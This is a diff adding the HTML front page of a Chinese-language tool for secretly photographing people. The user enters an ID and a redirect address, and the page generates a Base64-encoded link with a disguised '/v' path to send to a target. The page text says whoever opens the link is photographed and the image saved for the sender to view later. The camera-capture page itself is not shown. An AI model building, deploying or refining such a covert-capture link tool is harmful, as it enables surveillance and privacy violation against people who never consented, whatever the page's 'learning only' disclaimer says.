@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+    <link rel="icon" type="image/x-icon" href="logo.ico" />
+    <title>网恋翻车之乔碧萝你别跑！！</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+    <!-- DNS 预解析 - 加速 API 访问 -->
+    <link rel="dns-prefetch" href="//online-mirror.1334132303.workers.dev" />
+    <link
+      rel="preconnect"
+      href="https://online-mirror.1334132303.workers.dev"
+      crossorigin
+    />
+
+    <!-- 预加载关键资源 -->
+    <link rel="preload" href="config.js" as="script" />
+    <style>
+      body {
+        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+        margin: 0;
+        padding: 0;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        background: #f5f5f5;
+        min-height: 100vh;
+        justify-content: center;
+      }
+      .container {
+        width: 90%;
+        max-width: 600px;
+        margin: 15px;
+        background-color: #ffffff;
+        padding: 30px;
+        box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+        border-radius: 10px;
+        box-sizing: border-box;
+        text-align: center;
+      }
+      input {
+        width: 100%;
+        padding: 10px;
+        margin: 10px 0;
+        border-radius: 5px;
+        border: 1px solid #ddd;
+        box-sizing: border-box;
+        font-size: 14px;
+      }
+      .button-group {
+        display: flex;
+        justify-content: space-between;
+        flex-wrap: wrap;
+        margin: 15px 0;
+      }
+      button {
+        flex: 1 1 auto;
+        margin: 5px;
+        padding: 12px;
+        background-color: #4caf50;
+        color: white;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+        font-size: 16px;
+        transition: background-color 0.3s ease;
+      }
+      button:hover {
+        background-color: #45a049;
+      }
+      button:last-child {
+        margin-right: 0;
+      }
+      a {
+        word-break: break-all;
+        color: #1e90ff;
+        text-decoration: none;
+      }
+      a:hover {
+        text-decoration: underline;
+      }
+      p {
+        line-height: 1.6;
+        color: #333;
+        margin: 10px 0;
+        text-align: left;
+      }
+      /* 自定义提示框样式 */
+      .toast {
+        position: fixed;
+        top: 20px;
+        left: 50%;
+        transform: translateX(-50%);
+        background-color: #333;
+        color: #fff;
+        padding: 15px 25px;
+        border-radius: 8px;
+        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
+        z-index: 9999;
+        animation: slideDown 0.3s ease-out;
+        max-width: 80%;
+        word-wrap: break-word;
+        text-align: center;
+      }
+      .toast.success {
+        background-color: #4caf50;
+      }
+      .toast.error {
+        background-color: #f44336;
+      }
+      .toast.warning {
+        background-color: #ff9800;
+      }
+      @keyframes slideDown {
+        from {
+          top: -100px;
+          opacity: 0;
+        }
+        to {
+          top: 20px;
+          opacity: 1;
+        }
+      }
+      @keyframes slideUp {
+        from {
+          top: 20px;
+          opacity: 1;
+        }
+        to {
+          top: -100px;
+          opacity: 0;
+        }
+      }
+      .toast.hiding {
+        animation: slideUp 0.3s ease-in forwards;
+        /* forwards 确保动画结束后保持最终状态（opacity: 0） */
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <p>
+        <strong>1. 本工具仅做学习交流使用，请勿用于非法用途！后果自负！</strong>
+      </p>
+      <p>
+        <strong
+          >2.
+          懒得做数据库，ID是查看照片的凭证，不要泄露给知道这个平台的人。</strong
+        >
+      </p>
+      <p><strong>3. 为节省服务器资源，不定期删除7天前的数据。</strong></p>
+      <p>输入ID：<input type="text" id="myid" placeholder="输入您的ID" /></p>
+      <p>
+        拍摄后跳转到：<input type="text" id="url" value="https://baidu.com" />
+      </p>
+      <div class="button-group">
+        <button onclick="create();">生成链接</button>
+        <button onclick="checkPhoto();">查看照片</button>
+      </div>
+      <p>将以下链接地址发送给你要拍摄的对象，对方进入后将会拍摄照片并保存：</p>
+      <p><a id="kd" style="pointer-events: none">请先生成链接！</a></p>
+      <button id="copyBtn" style="display: none" onclick="copyToClipboard();">
+        复制链接
+      </button>
+      <p>
+        问题一：为什么拍摄的是黑屏？答：因为该浏览器不支持，更换浏览器即可，安卓用户建议直接在QQ内打开链接。
+      </p>
+      <p>
+        问题二：拍摄的照片不全？答：还没等跳转完成就关闭了页面，数据还没传输完成。
+      </p>
+    </div>
+
+    <script src="config.js"></script>
+    <script>
+      // 自定义提示函数
+      function showToast(message, type = "default", duration = 2500) {
+        const toast = document.createElement("div");
+        toast.className = `toast ${type}`;
+        toast.textContent = message;
+        document.body.appendChild(toast);
+
+        setTimeout(() => {
+          toast.classList.add("hiding");
+          setTimeout(() => {
+            // 确保元素存在后再移除，避免闪烁
+            if (toast.parentNode) {
+              document.body.removeChild(toast);
+            }
+          }, 350); // 稍微延长等待时间，确保动画完全结束
+        }, duration);
+      }
+
+      function getCurrentDirectory() {
+        var fullUrl = window.location.href;
+        var baseUrl = fullUrl.substring(0, fullUrl.lastIndexOf("/") + 1);
+        return baseUrl.replace("home.html", "");
+      }
+
+      function create() {
+        var myid = document.getElementById("myid").value;
+        var url = document.getElementById("url").value;
+        if (myid === "" || url === "") {
+          showToast("ID或跳转地址不能为空！", "warning");
+          return false;
+        }
+
+        var currentDirectory = getCurrentDirectory();
+
+        // 将参数编码为 Base64（格式：id|url）
+        var params = myid + "|" + url;
+        // 直接Base64编码，URL更短
+        var encodedParams = btoa(unescape(encodeURIComponent(params)));
+
+        // 直接生成原始链接，使用伪装路径 /v（通过 _redirects 重写到 v.html）
+        var link = currentDirectory + "v?d=" + encodedParams;
+
+        var kd = document.getElementById("kd");
+        kd.href = link;
+        kd.target = "_blank";
+        kd.innerText = link;
+        kd.style.pointerEvents = "auto";
+        document.getElementById("copyBtn").style.display = "block";
+        showToast("链接生成成功！", "success");
+      }
+
+      function copyToClipboard() {
+        var text = document.getElementById("kd").href;
+        navigator.clipboard.writeText(text).then(
+          function () {
+            showToast("链接已复制到剪贴板！", "success");
+          },
+          function (err) {
+            showToast("复制失败，请手动复制链接", "error");
+          }
+        );
+      }
+
+      function checkPhoto() {
+        var myid = document.getElementById("myid").value;
+        if (myid === "") {
+          showToast("ID不能为空！", "warning");
+          return false;
+        }
+        window.open("view.html?id=" + encodeURIComponent(myid), "_blank");
+      }
+    </script>
+  </body>
+</html>
